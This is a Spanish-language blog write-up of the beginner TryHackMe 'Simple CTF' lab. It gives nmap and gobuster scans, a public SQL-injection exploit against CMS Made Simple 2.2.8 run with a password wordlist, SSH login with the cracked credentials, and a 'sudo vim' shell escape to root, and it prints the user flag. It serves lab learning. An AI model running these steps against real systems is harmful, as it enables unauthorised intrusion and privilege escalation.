---
layout: single
title: Simple CTF - TryHackMe
excerpt: " Simple CTF is just that, a beginner-level CTF on TryHackMe that showcases a few of the necessary skills needed for all CTFs to include scanning and enumeration, research, exploitation, and privilege escalation. "
date: 2022-09-18
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-simplectf/simplectf.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:  
  - sqli
  - cmsmadesimple
  - ssh
---

Simple CTF is just that, **a beginner-level CTF on TryHackMe that showcases a few of the necessary skills needed for all CTFs to include scanning and enumeration, research, exploitation, and privilege escalation**.

# Summary
- IP: 10.10.129.26
- Ports: 21,80,2222
- OS: Linux (Ubuntu)
- Services & Applications:
	-  21 -> vsftpd 3.0.3
	-  80 -> Apache httpd 2.4.18
	-  2222 -> OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

# Recon

- Escaneo básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.129.26 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$sudo nmap -p21,80,2222 -sCV 10.10.129.26 -oN targeted
```


- Buscamos vulnerabilidades en las aplicaciones encontradas, ftp no nos da nada, la página no contiene nada relevante; hacemos escaneo de directorios con gobuster:

```bash
$gobuster dir -u http://10.10.129.26/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```


- Encontramos un directorio "simple", lo analizamos y encontramos una app web con su version, buscamos vulnerabilidades para la misma:

```bash
$searchsploit CMS Made Simple 2.2.8
```


- Encontramos una vulnerabilidad SQLi, exportamos la script de python y la ejecutamos

```bash
$python2.7 46635.py -u http://10.10.129.26/simple/ --crack -w /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
```


- Obtenemos credenciales e intentamos conectarnos por ssh:

```bash
ssh mitch@10.10.129.26 -p 2222
```


- Encontramos la user flag:
# USER FLAG: G00d j0b, keep up!

- Buscamos binarios con permisos de sudoers:

```bash
mitch@machine:/$sudo -l
```


- Vemos que podemos ejecutar como sudoer el binario "vim", el cual buscamos en gtfobins para poder escalar privilegios:
```bash
sudo vim -c ':!/bin/sh'
```

- Encontramos la root flag:
# ROOT FLAG: ***********************
